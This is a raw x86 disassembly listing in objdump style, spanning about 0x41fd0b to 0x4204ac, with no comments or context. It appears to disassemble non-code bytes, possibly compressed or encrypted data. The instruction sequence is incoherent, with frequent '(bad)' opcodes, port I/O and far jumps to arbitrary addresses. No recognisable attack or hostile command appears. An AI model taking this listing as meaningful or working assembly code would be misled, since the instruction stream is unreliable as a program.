  41fd0b:	mov    WORD PTR [eax],es
  41fd0d:	int3   
  41fd0e:	cmp    eax,0x3f1fae6c
  41fd13:	les    edx,FWORD PTR [ecx-0x2257d0de]
  41fd19:	(bad)  
  41fd1a:	enter  0x62cb,0x98
  41fd1e:	dec    esp
  41fd1f:	shl    al,cl
  41fd21:	fwait
  41fd22:	push   0x5c
  41fd24:	push   es
  41fd25:	pop    ecx
  41fd26:	mov    BYTE PTR [eax+esi*2+0x57931d12],0xdc
  41fd2e:	mov    bh,0x2e
  41fd30:	jnp    0x41fcc1
  41fd32:	xchg   esp,eax
  41fd33:	loop   0x41fd94
  41fd35:	lods   eax,DWORD PTR ds:[esi]
  41fd36:	xchg   edi,eax
  41fd37:	or     eax,0x4d7c7983
  41fd3c:	jle    0x41fdb6
  41fd3e:	sbb    DWORD PTR [eax],esi
  41fd40:	in     eax,0x6c
  41fd42:	es push ds
  41fd44:	ss aaa 
  41fd46:	dec    eax
  41fd47:	and    al,0x44
  41fd49:	mov    al,ds:0xfdfb94ac
  41fd4e:	mov    edi,0x3aa1e8d8
  41fd53:	stos   DWORD PTR es:[edi],eax
  41fd54:	inc    ebp
  41fd55:	imul   edi,edx,0x5c
  41fd58:	adc    eax,0xdc6854ec
  41fd5d:	or     al,dl
  41fd5f:	xor    dh,BYTE PTR [esi-0x33c7d127]
  41fd65:	cmp    BYTE PTR [esi-0x7f27026e],ch
  41fd6b:	xchg   esp,eax
  41fd6c:	jmp    0x857bf4ee
  41fd71:	mov    dh,0x1d
  41fd73:	sub    BYTE PTR [edi+0x13],al
  41fd76:	dec    ecx
  41fd77:	mov    al,0x4b
  41fd79:	mov    esi,0x1be68406
  41fd7e:	xor    BYTE PTR [esi],cl
  41fd80:	aad    0x54
  41fd82:	pop    ebx
  41fd83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd84:	jns    0x41fd65
  41fd86:	cdq    
  41fd87:	(bad)  
  41fd88:	xchg   ebx,eax
  41fd89:	je     0x41fda9
  41fd8b:	loope  0x41fdc1
  41fd8d:	xor    DWORD PTR [edi],ebx
  41fd8f:	dec    eax
  41fd90:	enter  0x9b3b,0x78
  41fd94:	ret    
  41fd95:	and    dl,BYTE PTR [edi-0x461bacab]
  41fd9b:	pop    DWORD PTR [edi]
  41fd9d:	sbb    eax,DWORD PTR [eax]
  41fd9f:	mov    edx,0x1f1c1aff
  41fda4:	sub    esi,ecx
  41fda6:	inc    ecx
  41fda7:	ret    
  41fda8:	in     eax,0x54
  41fdaa:	jmp    0x36b3:0x30074cb6
  41fdb1:	enter  0xeaf3,0xb1
  41fdb5:	int3   
  41fdb6:	out    0xaf,al
  41fdb8:	and    edx,DWORD PTR [edx+0x24]
  41fdbb:	xor    DWORD PTR [ecx+0x3d3c3d25],ebx
  41fdc1:	adc    DWORD PTR [edi+edi*8],esi
  41fdc4:	pop    es
  41fdc5:	sbb    ch,BYTE PTR [edx-0x4f]
  41fdc8:	les    eax,FWORD PTR [edi+0xa]
  41fdcb:	or     ebp,DWORD PTR [ebx]
  41fdcd:	retf   
  41fdce:	cmp    ebp,ecx
  41fdd0:	fs jl  0x41fd7a
  41fdd3:	jecxz  0x41fdef
  41fdd5:	sub    al,BYTE PTR [edi+0x67a49230]
  41fddb:	clc    
  41fddc:	lahf   
  41fddd:	cmp    bh,BYTE PTR [edi]
  41fddf:	jbe    0x41fe1d
  41fde1:	out    dx,eax
  41fde2:	inc    esi
  41fde3:	dec    ecx
  41fde4:	ror    DWORD PTR [edi+0x46],0xc2
  41fde8:	mov    edi,0xb134660
  41fded:	ret    
  41fdee:	dec    ecx
  41fdef:	loop   0x41fe65
  41fdf1:	ficom  DWORD PTR [eax-0x22]
  41fdf4:	jecxz  0x41fd7c
  41fdf6:	pushf  
  41fdf7:	cmc    
  41fdf8:	in     eax,dx
  41fdf9:	mov    dl,0xcf
  41fdfb:	mov    ah,0x3f
  41fdfd:	sahf   
  41fdfe:	out    dx,eax
  41fdff:	fisub  WORD PTR [edi+0x3a]
  41fe02:	fs (bad) 
  41fe04:	lods   al,BYTE PTR ds:[esi]
  41fe05:	les    edx,FWORD PTR [edx-0x4516aa5f]
  41fe0b:	sbb    dh,BYTE PTR [eax]
  41fe0d:	scas   al,BYTE PTR es:[edi]
  41fe0e:	aad    0x87
  41fe10:	pop    es
  41fe11:	or     DWORD PTR [ebp-0x3e],ebx
  41fe14:	and    eax,0x4bf6c7ae
  41fe19:	aam    0x37
  41fe1b:	repnz mov bh,BYTE PTR [esi+eiz*1+0x763d39b3]
  41fe23:	in     eax,0x1e
  41fe25:	mov    ds:0x14b40e58,al
  41fe2a:	gs fs jmp 0x41fe59
  41fe2e:	sub    BYTE PTR [edx-0x5ada5d45],ch
  41fe34:	jmp    0xee1d7598
  41fe39:	push   esp
  41fe3a:	xchg   ebp,eax
  41fe3b:	shr    DWORD PTR [esi+0x20],1
  41fe3e:	(bad)  
  41fe3f:	sbb    eax,0xfa5f0d74
  41fe44:	aad    0xbc
  41fe46:	or     DWORD PTR [esi],esp
  41fe48:	adc    eax,0x24b27082
  41fe4d:	jb     0x41fe30
  41fe4f:	pop    esi
  41fe50:	stos   BYTE PTR es:[edi],al
  41fe51:	mov    dl,0x5b
  41fe53:	push   ebp
  41fe54:	dec    edi
  41fe55:	into   
  41fe56:	push   edx
  41fe57:	cdq    
  41fe58:	push   edx
  41fe59:	push   0xd75258df
  41fe5e:	lea    ebx,[ebp+0x7f591239]
  41fe64:	jae    0x41fdf8
  41fe66:	loope  0x41fedb
  41fe68:	repz inc DWORD PTR [esi-0x3c]
  41fe6c:	push   0x521b48fc
  41fe71:	add    eax,0xbdaa0894
  41fe76:	arpl   WORD PTR [ecx-0x58988ed9],si
  41fe7c:	sahf   
  41fe7d:	mov    edi,0x98bb36ab
  41fe82:	icebp  
  41fe83:	inc    ecx
  41fe84:	ror    DWORD PTR [ebp-0x34243c0c],cl
  41fe8a:	sbb    BYTE PTR [ecx],0x21
  41fe8d:	(bad)  
  41fe8f:	cmp    eax,edi
  41fe91:	jnp    0x41feba
  41fe93:	mov    al,ds:0x3cae116b
  41fe98:	dec    esi
  41fe99:	or     DWORD PTR [ecx],edx
  41fe9b:	ficomp DWORD PTR [esp+eiz*4]
  41fe9e:	xor    cl,BYTE PTR [eax+0x37]
  41fea1:	test   eax,0x8a06f38c
  41fea6:	xchg   edi,eax
  41fea7:	push   edx
  41fea8:	jle    0x41fece
  41feaa:	lock ins BYTE PTR es:[edi],dx
  41feac:	sbb    cl,BYTE PTR [esi-0x3d]
  41feaf:	repz repz inc ebp
  41feb2:	repnz push edx
  41feb4:	pop    es
  41feb5:	lahf   
  41feb6:	sbb    ebp,DWORD PTR [eax]
  41feb8:	loop   0x41fec8
  41feba:	push   esi
  41febb:	(bad)  
  41febc:	outs   dx,DWORD PTR ds:[esi]
  41febd:	mul    edi
  41febf:	lahf   
  41fec0:	pop    esi
  41fec1:	pop    edx
  41fec2:	xchg   ecx,eax
  41fec3:	jmp    0xa34d568a
  41fec8:	pop    esi
  41fec9:	push   cs
  41feca:	mov    bh,0xc8
  41fecc:	jmp    0x41fe6c
  41fece:	xor    al,0x18
  41fed0:	(bad)  
  41fed2:	ins    BYTE PTR es:[edi],dx
  41fed3:	test   al,0x2b
  41fed5:	push   0xffffffd8
  41fed7:	fnstsw WORD PTR [ecx-0x13deb1fe]
  41fedd:	dec    esp
  41fede:	ret    0x9d66
  41fee1:	enter  0xf318,0xad
  41fee5:	iret   
  41fee6:	je     0x41fee0
  41fee8:	push   0x51
  41feea:	pusha  
  41feeb:	xor    eax,0x4e3bd9f
  41fef0:	add    bh,BYTE PTR [ecx]
  41fef2:	add    ebx,ebp
  41fef4:	pshufw mm4,QWORD PTR [ecx+0x8888c3b],0x36
  41fefc:	adc    DWORD PTR [edi],esi
  41fefe:	or     bh,BYTE PTR [esi+0x5f]
  41ff01:	lds    edx,FWORD PTR [edi+0x19]
  41ff04:	adc    dl,BYTE PTR [eax+0x145bf89e]
  41ff0a:	and    edi,DWORD PTR [ecx]
  41ff0c:	add    BYTE PTR [ecx],0x47
  41ff0f:	icebp  
  41ff10:	in     eax,dx
  41ff11:	mov    WORD PTR [ebx],fs
  41ff13:	(bad)  
  41ff14:	loop   0x41febc
  41ff16:	pop    esi
  41ff17:	inc    ebx
  41ff18:	inc    ebp
  41ff19:	dec    esp
  41ff1a:	mov    edx,0x265021d3
  41ff1f:	sub    DWORD PTR [eax+ecx*2],edx
  41ff22:	into   
  41ff23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff24:	lds    ebp,FWORD PTR [edi+ecx*2-0xb]
  41ff28:	mov    dh,0x3
  41ff2a:	or     dl,BYTE PTR [edx+0x412712b6]
  41ff30:	mov    eax,0x5fb0e4b0
  41ff35:	cli    
  41ff36:	add    al,0x8
  41ff38:	clc    
  41ff39:	(bad)  
  41ff3a:	xchg   ecx,eax
  41ff3b:	mov    ds:0xfebd8f42,eax
  41ff40:	stos   BYTE PTR es:[edi],al
  41ff41:	sbb    al,0x25
  41ff43:	mov    bl,0x1a
  41ff45:	mov    ah,bl
  41ff47:	shr    DWORD PTR fs:[eax],0xe6
  41ff4b:	jne    0x41ff75
  41ff4d:	ins    DWORD PTR es:[edi],dx
  41ff4e:	test   BYTE PTR [esp+ebp*2+0x30f70983],0xd3
  41ff56:	or     dl,BYTE PTR [edi+0x23]
  41ff59:	pop    ss
  41ff5a:	dec    esi
  41ff5b:	mov    al,0xcc
  41ff5d:	shl    BYTE PTR [ecx+0x5a64610a],1
  41ff63:	aam    0x7a
  41ff65:	xchg   edi,eax
  41ff66:	xor    edi,esi
  41ff68:	sub    esi,ebx
  41ff6a:	idiv   bl
  41ff6c:	dec    eax
  41ff6d:	jp     0x41ffe4
  41ff6f:	mov    edi,ecx
  41ff71:	imul   edi,DWORD PTR [eax],0x56c6b24b
  41ff77:	add    eax,0x1b83d3b6
  41ff7c:	pop    ecx
  41ff7d:	leave  
  41ff7e:	nop
  41ff7f:	mov    edx,0x33e62f72
  41ff84:	inc    ebx
  41ff85:	mov    ds:0xb41329b8,eax
  41ff8a:	fdecstp 
  41ff8c:	in     al,0x71
  41ff8e:	add    al,0xf9
  41ff90:	ret    
  41ff91:	push   ds
  41ff92:	fdivr  st,st(2)
  41ff94:	out    0xdc,al
  41ff96:	shr    BYTE PTR [esi],1
  41ff98:	lea    ebx,[edx+0x5936ec]
  41ff9e:	in     eax,dx
  41ff9f:	xchg   ebp,eax
  41ffa0:	out    dx,eax
  41ffa1:	call   0xea4a:0x5be0ed57
  41ffa8:	add    BYTE PTR [edx],bl
  41ffaa:	jnp    0x41ff40
  41ffac:	jmp    0x41ff7e
  41ffae:	or     eax,0x70126962
  41ffb3:	xchg   ebx,eax
  41ffb4:	popf   
  41ffb5:	lahf   
  41ffb6:	in     al,0x7e
  41ffb8:	rcl    bl,cl
  41ffba:	scas   al,BYTE PTR es:[edi]
  41ffbb:	in     eax,dx
  41ffbc:	out    dx,eax
  41ffbd:	xchg   ebp,eax
  41ffbe:	mov    ah,0xe1
  41ffc0:	sbb    BYTE PTR [ebp+0x1c],dh
  41ffc3:	xchg   ebx,eax
  41ffc4:	ret    
  41ffc5:	sahf   
  41ffc6:	inc    ebp
  41ffc7:	dec    edi
  41ffc8:	lods   eax,DWORD PTR ds:[esi]
  41ffc9:	jno    0x420010
  41ffcb:	(bad)  
  41ffcc:	jnp    0x42002e
  41ffce:	int    0x14
  41ffd0:	inc    ebp
  41ffd1:	mov    ecx,0x624182f6
  41ffd6:	and    DWORD PTR [ebx],edx
  41ffd8:	inc    ecx
  41ffd9:	adc    eax,0xf853c1ab
  41ffde:	sahf   
  41ffdf:	scas   al,BYTE PTR es:[edi]
  41ffe0:	cdq    
  41ffe1:	shl    DWORD PTR [esi-0x64],1
  41ffe4:	in     eax,dx
  41ffe5:	mov    al,ds:0xc09ef3f5
  41ffea:	repnz aam 0xb9
  41ffed:	xchg   ecx,esp
  41ffef:	pop    esp
  41fff0:	cli    
  41fff1:	adc    eax,0xeda6c305
  41fff6:	xchg   esi,eax
  41fff7:	jg     0x420058
  41fff9:	fld    TBYTE PTR [edx-0x3c]
  41fffc:	jmp    0xff646769
  420001:	ins    DWORD PTR es:[edi],dx
  420002:	jp     0x420079
  420004:	(bad)  
  420005:	pushf  
  420006:	jnp    0x42004d
  420008:	bound  edx,QWORD PTR [edx+0x63]
  42000b:	push   ebp
  42000c:	inc    ebx
  42000d:	sbb    eax,0xcb58e661
  420012:	push   edx
  420013:	inc    edi
  420014:	ins    BYTE PTR es:[edi],dx
  420015:	dec    edx
  420016:	repz push cs
  420018:	repz pop esi
  42001a:	nop
  42001b:	add    BYTE PTR [eax],ah
  42001d:	xchg   esp,eax
  42001e:	ins    DWORD PTR es:[edi],dx
  42001f:	jmp    0x2981:0xd8da3ead
  420026:	pmaxsw mm2,QWORD PTR [edi-0x421d4f38]
  42002d:	stc    
  42002e:	not    DWORD PTR [edi+0x5c21056f]
  420034:	frstor ds:0x45d86be6
  42003a:	ficom  DWORD PTR [eax+0x5eae740f]
  420040:	mov    ch,0xe5
  420042:	mov    edi,0xd4501f6c
  420047:	fild   QWORD PTR [edi+ebx*4]
  42004a:	mov    cl,0x7c
  42004c:	push   eax
  42004d:	cmp    al,0xe5
  42004f:	in     eax,0x27
  420051:	cs mov ebp,0x125c72e4
  420057:	adc    DWORD PTR [ecx-0x40],esp
  42005a:	xor    esp,DWORD PTR [eax]
  42005c:	adc    eax,0x3fe4fe41
  420061:	ror    DWORD PTR [eax],cl
  420063:	iret   
  420064:	rcr    ch,cl
  420066:	aad    0x52
  420068:	cdq    
  420069:	aad    0xb4
  42006b:	add    BYTE PTR [ebp-0x622ffad8],0xe5
  420072:	mov    bh,dh
  420074:	std    
  420075:	xor    bl,BYTE PTR [esi+eiz*2+0x17]
  420079:	stc    
  42007a:	aad    0xd9
  42007c:	push   0x53421b3
  420081:	xchg   esp,eax
  420082:	fdiv   DWORD PTR cs:[edx]
  420085:	repnz or BYTE PTR [esi],cl
  420088:	mov    ch,0x55
  42008a:	and    DWORD PTR [eax],esp
  42008c:	xor    DWORD PTR [ebp*4+0x70e4c13c],esp
  420093:	lods   eax,DWORD PTR ds:[esi]
  420094:	mov    esp,DWORD PTR [esi+0x743c474c]
  42009a:	aam    0xc4
  42009c:	fadd   QWORD PTR [edi+0x6d]
  42009f:	sub    bh,BYTE PTR [edi]
  4200a1:	lock (bad) 
  4200a3:	dec    ebx
  4200a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200a5:	inc    ebx
  4200a6:	mov    eax,DWORD PTR [ecx-0x7a]
  4200a9:	xor    al,0x69
  4200ab:	cmp    BYTE PTR [ebx],cl
  4200ad:	dec    esi
  4200ae:	mov    WORD PTR [ebp+0x3caf8a95],?
  4200b4:	xor    BYTE PTR [ebx-0x46c61f46],0x50
  4200bb:	not    BYTE PTR [edx]
  4200bd:	mov    bl,0x80
  4200bf:	test   BYTE PTR [eax],bl
  4200c1:	add    al,0x95
  4200c3:	inc    esi
  4200c4:	fiadd  WORD PTR [ebp-0x318af10a]
  4200ca:	mov    edi,0x61c37f20
  4200cf:	dec    ebp
  4200d0:	jb     0x42009a
  4200d2:	lsl    edi,sp
  4200d5:	adc    ch,bh
  4200d7:	lds    edi,FWORD PTR [eax+0xc]
  4200da:	mov    ebx,0x1b7e483e
  4200df:	sbb    DWORD PTR [edi],edx
  4200e1:	mov    eax,0xd5d64418
  4200e6:	lea    ebp,[eax-0x26]
  4200e9:	push   ss
  4200ea:	sbb    edi,esp
  4200ec:	iret   
  4200ed:	mov    cs,edi
  4200ef:	push   eax
  4200f0:	jp     0x420157
  4200f2:	les    edi,FWORD PTR [eax-0x43]
  4200f5:	loopne 0x42010a
  4200f7:	mov    ds:0x922ff106,eax
  4200fc:	xchg   ebx,esi
  4200fe:	jl     0x420161
  420100:	push   ecx
  420101:	dec    eax
  420102:	inc    ebx
  420103:	imul   ebp,esi,0xf2e5a935
  420109:	and    al,0xc1
  42010b:	pop    edx
  42010c:	push   ds
  42010d:	ret    0x7e7c
  420110:	cmp    edx,esi
  420112:	ins    DWORD PTR es:[edi],dx
  420113:	add    DWORD PTR [eax+esi*2],edi
  420116:	xchg   edx,eax
  420117:	iret   
  420118:	inc    ebx
  420119:	mov    esp,ds
  42011b:	mov    DWORD PTR [edx+0x3c12bfc1],edx
  420121:	popf   
  420122:	sbb    al,0xc8
  420124:	pop    es
  420125:	ret    0xbe38
  420128:	cli    
  420129:	ins    BYTE PTR es:[edi],dx
  42012a:	sub    DWORD PTR [edx+0x101b4b8e],0x6
  420131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420132:	icebp  
  420133:	cmp    al,0xd7
  420135:	mov    WORD PTR [edi],gs
  420137:	(bad)  
  420138:	dec    esi
  420139:	mul    DWORD PTR [esi+0x2b]
  42013c:	(bad)  
  42013d:	and    edx,ebp
  42013f:	pop    ebx
  420140:	(bad)  
  420141:	retf   
  420142:	pop    ebp
  420143:	shr    DWORD PTR [ebx-0x44],0x5f
  420147:	ds scas eax,DWORD PTR es:[edi]
  420149:	mov    BYTE PTR [edi+0x721e5de2],ah
  42014f:	and    edi,DWORD PTR [ecx-0x6d5c9e37]
  420155:	xor    BYTE PTR [ebp-0x53],dl
  420158:	dec    edx
  420159:	(bad)  
  42015b:	xor    eax,0x227cd005
  420160:	dec    edx
  420161:	stos   BYTE PTR es:[edi],al
  420162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420163:	mov    edi,0xd1612c2b
  420168:	jno    0x420167
  42016a:	mov    bl,0xa9
  42016c:	cdq    
  42016d:	adc    BYTE PTR [ebx+0x1477d5ff],al
  420173:	adc    bl,BYTE PTR [ecx-0x80]
  420176:	scas   eax,DWORD PTR es:[edi]
  420177:	(bad)  
  420178:	cmp    cl,BYTE PTR [ebp+0x6a68a6d5]
  42017e:	in     al,0x6a
  420180:	ins    BYTE PTR es:[edi],dx
  420181:	push   esi
  420182:	xlat   BYTE PTR ds:[ebx]
  420183:	push   ecx
  420184:	xchg   ebp,eax
  420185:	icebp  
  420186:	call   0x78a886c2
  42018b:	and    esp,0xfb4a51ac
  420191:	popa   
  420192:	mov    WORD PTR [ebx],es
  420194:	icebp  
  420195:	push   edx
  420196:	jmp    0xa606:0xa3e872a3
  42019d:	push   ds
  42019e:	leave  
  42019f:	dec    ebx
  4201a0:	fiadd  DWORD PTR [edx+0x36]
  4201a3:	xor    eax,0xb0895c48
  4201a8:	fst    DWORD PTR [ebp+0x44]
  4201ab:	and    DWORD PTR [esi+0x7215e8c0],ebx
  4201b1:	loopne 0x420143
  4201b3:	out    dx,al
  4201b4:	icebp  
  4201b5:	adc    DWORD PTR [edi+0x68],edx
  4201b8:	inc    BYTE PTR [esi]
  4201ba:	out    dx,eax
  4201bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201bc:	ss jne 0x420187
  4201bf:	retf   
  4201c0:	mov    ds:0xda7b3072,al
  4201c5:	add    DWORD PTR [ecx+0x23],ebx
  4201c8:	clc    
  4201c9:	out    0x88,al
  4201cb:	test   BYTE PTR [eax+edi*1],bh
  4201ce:	cmc    
  4201cf:	les    eax,FWORD PTR [esi-0x56b7b730]
  4201d5:	sub    dh,BYTE PTR [edi]
  4201d7:	dec    edx
  4201d8:	movnti DWORD PTR [esi],eax
  4201db:	aam    0x98
  4201dd:	pop    es
  4201de:	xchg   esi,eax
  4201df:	call   0x581b:0x80b0e27c
  4201e6:	div    bl
  4201e8:	adc    BYTE PTR [ebp+ecx*1-0x716c11c9],al
  4201ef:	imul   esi,DWORD PTR [edi+ebx*8+0x69],0xffffffed
  4201f4:	pop    esi
  4201f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201f6:	cmp    DWORD PTR [edx-0x3818197d],ebx
  4201fc:	ret    0x5db9
  4201ff:	imul   ecx,DWORD PTR [edi],0x6ed9ae94
  420205:	xor    eax,0x9181d1f5
  42020a:	cdq    
  42020b:	(bad)  
  42020c:	test   al,0x14
  42020e:	sbb    esi,DWORD PTR [edi+0x38]
  420211:	pop    ss
  420212:	dec    esi
  420213:	(bad)  
  420214:	fcomi  st,st(5)
  420216:	shl    BYTE PTR [edx],0x2c
  420219:	adc    BYTE PTR ds:0xaeead9a,dl
  42021f:	cmp    eax,0x96d5d4c5
  420224:	nop
  420225:	les    ebp,FWORD PTR [eax+esi*8+0x43c62c0e]
  42022c:	jecxz  0x420292
  42022e:	or     bl,BYTE PTR [eax+0x55ec2b97]
  420234:	adc    ch,cl
  420236:	cdq    
  420237:	dec    ecx
  420238:	ret    0xc69c
  42023b:	mov    edx,0x73152b7f
  420240:	rcr    DWORD PTR [ecx+ecx*4],cl
  420243:	inc    ebx
  420244:	lock cmc 
  420246:	rcl    dl,0x32
  420249:	or     ecx,edx
  42024b:	mov    bh,0x19
  42024d:	mov    ah,0xf3
  42024f:	(bad)  
  420250:	loopne 0x420230
  420252:	push   esp
  420253:	adc    dl,BYTE PTR [edx-0x20a8312d]
  420259:	sbb    al,0xde
  42025b:	loopne 0x4201e0
  42025d:	cmp    DWORD PTR [eax],0x71017a9c
  420263:	int    0x65
  420265:	outs   dx,DWORD PTR ds:[esi]
  420266:	mov    eax,ds:0x517f8f3a
  42026b:	fs mov dl,0xe4
  42026e:	pop    edx
  42026f:	cmp    BYTE PTR [edx-0x43],dl
  420272:	mov    bh,dl
  420274:	sub    al,BYTE PTR [ebx]
  420276:	(bad)  
  420277:	sbb    ebp,DWORD PTR [ebx]
  420279:	cmp    BYTE PTR ds:0x54fc839b,bl
  42027f:	mov    bl,0x6
  420281:	mov    ebx,0x11890421
  420286:	ret    
  420287:	(bad)  
  420288:	mov    ebx,0x871876ec
  42028d:	mov    ah,0xf
  42028f:	and    ah,BYTE PTR [esi]
  420291:	jnp    0x4202f0
  420293:	mov    dl,0x3b
  420295:	jne    0x4202bf
  420297:	rol    DWORD PTR [edx],cl
  420299:	fiadd  DWORD PTR [edi]
  42029b:	mov    ebx,DWORD PTR [eax+0x27]
  42029e:	pusha  
  42029f:	sbb    eax,0x998d7737
  4202a4:	push   ds
  4202a5:	popa   
  4202a6:	cdq    
  4202a7:	imul   edi,DWORD PTR [ecx],0x5975527
  4202ad:	ins    BYTE PTR es:[edi],dx
  4202ae:	test   al,0x1e
  4202b0:	test   DWORD PTR [edi-0x49f2257a],esi
  4202b6:	adc    bh,BYTE PTR [edi+0x69ac4616]
  4202bc:	repnz pop eax
  4202be:	xor    edi,DWORD PTR [ecx-0x627b2458]
  4202c4:	ret    
  4202c5:	and    eax,0xe5c64a55
  4202ca:	pop    edx
  4202cb:	nop
  4202cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202cd:	cmp    eax,0xf42323b9
  4202d2:	hlt    
  4202d3:	(bad)  
  4202d4:	pcmpgtd mm4,QWORD PTR [ebx]
  4202d7:	pop    ebp
  4202d8:	jp     0x420271
  4202da:	aaa    
  4202db:	jns    0x4202f1
  4202dd:	out    dx,eax
  4202de:	(bad)  
  4202df:	push   ebx
  4202e0:	dec    ebx
  4202e1:	mov    eax,ds:0x5696c241
  4202e6:	jle    0x420348
  4202e8:	sahf   
  4202e9:	mov    edx,0x3f8b9737
  4202ee:	loop   0x4202dc
  4202f0:	scas   eax,DWORD PTR es:[edi]
  4202f1:	fiadd  DWORD PTR [esi+0x2a0ace7a]
  4202f7:	jae    0x420299
  4202f9:	inc    esp
  4202fa:	(bad)
  4202fd:	cwde   
  4202fe:	sbb    edi,0xfffffffb
  420301:	cld    
  420302:	xchg   ecx,eax
  420303:	jae    0x42033c
  420305:	(bad)  
  420306:	addr16 fwait
  420308:	xor    esi,edi
  42030a:	push   ebp
  42030b:	in     eax,0x11
  42030d:	add    DWORD PTR [ebp+0x4e14a0f6],eax
  420313:	mov    ebp,0x3bd859d3
  420318:	pop    edx
  420319:	pop    esi
  42031a:	int    0xe8
  42031c:	sub    DWORD PTR [eax-0x57],edi
  42031f:	fcomp  st(4)
  420321:	test   eax,0x150ee1f6
  420326:	pop    ds
  420327:	in     ax,dx
  420329:	popf   
  42032a:	lock sub edi,DWORD PTR [eax]
  42032d:	loope  0x4202af
  42032f:	mov    eax,ds:0x952cee78
  420334:	into   
  420335:	jmp    0x3d02:0x8fda7c36
  42033c:	test   eax,0x2580cc7
  420341:	fst    QWORD PTR [ecx-0x4d]
  420344:	fidivr DWORD PTR [edx+edx*2-0x73cbf662]
  42034b:	inc    esp
  42034c:	lock pop edi
  42034e:	scas   al,BYTE PTR es:[edi]
  42034f:	cli    
  420350:	add    eax,0x5b16f27a
  420355:	pop    edi
  420356:	mov    edi,0x6bcf8a7f
  42035b:	lods   eax,DWORD PTR ds:[esi]
  42035c:	leave  
  42035d:	ret    0x897f
  420360:	popf   
  420361:	in     al,0xf2
  420363:	pop    edi
  420364:	imul   esi,DWORD PTR [edx+0x5f],0xffffffac
  420368:	sbb    al,0xa1
  42036a:	jmp    0x95cd:0x1f013945
  420371:	adc    cl,ah
  420373:	(bad)  
  420374:	mov    edi,0x44cb41
  420379:	jo     0x4203a8
  42037b:	fsubr  DWORD PTR [edx+0x3712fa0f]
  420381:	clc    
  420382:	inc    esi
  420383:	pop    edi
  420384:	pop    es
  420385:	xchg   edx,eax
  420386:	mov    cl,0x63
  420388:	addr16 mov ah,0x1d
  42038b:	push   0x9ea1033c
  420390:	sbb    esi,DWORD PTR [ebx+0x5b]
  420393:	and    al,al
  420395:	ret    0x23b3
  420398:	bswap  eax
  42039a:	xor    dl,BYTE PTR [edi]
  42039c:	xor    ecx,0x7c65fcd9
  4203a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203a3:	add    eax,0x79096ade
  4203a8:	jo     0x42034d
  4203aa:	test   eax,0x7a6fe6e2
  4203af:	xchg   DWORD PTR [eax+0x61b9da12],ebp
  4203b5:	pop    ebx
  4203b6:	std    
  4203b7:	adc    bh,BYTE PTR [eax]
  4203b9:	push   esi
  4203ba:	sar    esi,0xe9
  4203bd:	xchg   ebp,eax
  4203be:	and    BYTE PTR [ecx],dh
  4203c0:	xor    DWORD PTR [eax],eax
  4203c2:	cwde   
  4203c3:	or     DWORD PTR [eax],edi
  4203c5:	inc    ebx
  4203c6:	jns    0x42040f
  4203c8:	(bad)  [eax+ebx*4+0x41859858]
  4203cf:	jne    0x420427
  4203d1:	jg     0x4203b5
  4203d3:	stc    
  4203d4:	xchg   ebx,eax
  4203d5:	(bad)  
  4203d6:	lock sti 
  4203d8:	or     edx,DWORD PTR cs:[eax]
  4203db:	pop    ss
  4203dc:	mov    eax,0xd0169f03
  4203e1:	enter  0x48e9,0x47
  4203e5:	jl     0x4203de
  4203e7:	in     eax,dx
  4203e8:	jb     0x420412
  4203ea:	push   0x14
  4203ec:	in     al,0xb3
  4203ee:	popa   
  4203ef:	cwde   
  4203f0:	mov    cl,0x32
  4203f2:	mov    esi,0xb51b3ff1
  4203f7:	not    BYTE PTR [edx]
  4203f9:	cmp    DWORD PTR [esi],esi
  4203fb:	fist   WORD PTR [edi+0x10fc4e07]
  420401:	pop    edx
  420402:	rol    DWORD PTR [esi],1
  420404:	call   0x2ba8:0x4221393
  42040b:	ss jg  0x42041a
  42040e:	popa   
  42040f:	loopne 0x420453
  420411:	sbb    DWORD PTR [edx],edi
  420413:	stc    
  420414:	fs sub eax,0xd7c43ee
  42041a:	mov    edi,0xda0a2b12
  42041f:	lds    eax,FWORD PTR [edi-0x36]
  420422:	jns    0x42044e
  420424:	xor    cl,BYTE PTR [edi+ebp*8]
  420427:	loope  0x4203d6
  420429:	ins    DWORD PTR es:[edi],dx
  42042a:	jmp    0x325b13f2
  42042f:	ret    
  420430:	outs   dx,BYTE PTR ds:[esi]
  420431:	iret   
  420432:	mov    al,0xa6
  420434:	leave  
  420435:	jmp    0x83a57c95
  42043a:	sahf   
  42043b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42043c:	push   ds
  42043d:	cdq    
  42043e:	(bad)  
  420440:	inc    edx
  420441:	in     eax,dx
  420442:	lds    ebp,FWORD PTR [ebp+0x2a2d6ccf]
  420448:	sbb    al,0x7a
  42044a:	outs   dx,BYTE PTR ds:[esi]
  42044b:	and    eax,0x44557734
  420450:	jae    0x42043b
  420452:	jo     0x4204bd
  420454:	jmp    0xfe0a:0x7b23f789
  42045b:	int    0x4
  42045d:	sbb    dl,BYTE PTR [esi+0x1ec27c95]
  420463:	jmp    FWORD PTR [edi]
  420465:	ds mov ebx,0xa02e7853
  42046b:	imul   DWORD PTR [edx+ebp*2+0x6e8721a7]
  420472:	sbb    BYTE PTR [eax],ah
  420474:	xchg   ecx,eax
  420475:	fcom   DWORD PTR [esi+ebx*8-0x48]
  420479:	dec    eax
  42047a:	mov    bl,0x7e
  42047c:	nop
  42047d:	and    al,0x29
  42047f:	ins    DWORD PTR es:[edi],dx
  420480:	xor    edi,DWORD PTR [edx+0x48]
  420483:	daa    
  420484:	mul    BYTE PTR [eax]
  420486:	pop    ecx
  420487:	lea    esi,[ebp+0x13dc19e7]
  42048d:	dec    ebp
  42048e:	jl     0x420483
  420490:	push   eax
  420491:	push   edi
  420492:	pop    es
  420493:	loope  0x42050a
  420495:	jp     0x42044c
  420497:	jmp    0x420482
  420499:	test   al,0x63
  42049b:	aas    
  42049c:	mov    eax,0x7fa8b6fd
  4204a1:	mov    esp,edi
  4204a3:	pushf  
  4204a4:	or     BYTE PTR ds:0x5407fe2,dl
  4204aa:	inc    esi
  4204ab:	cli    
  4204ac:	fldcw  WORD PTR [edx-0x2d32c7a6]
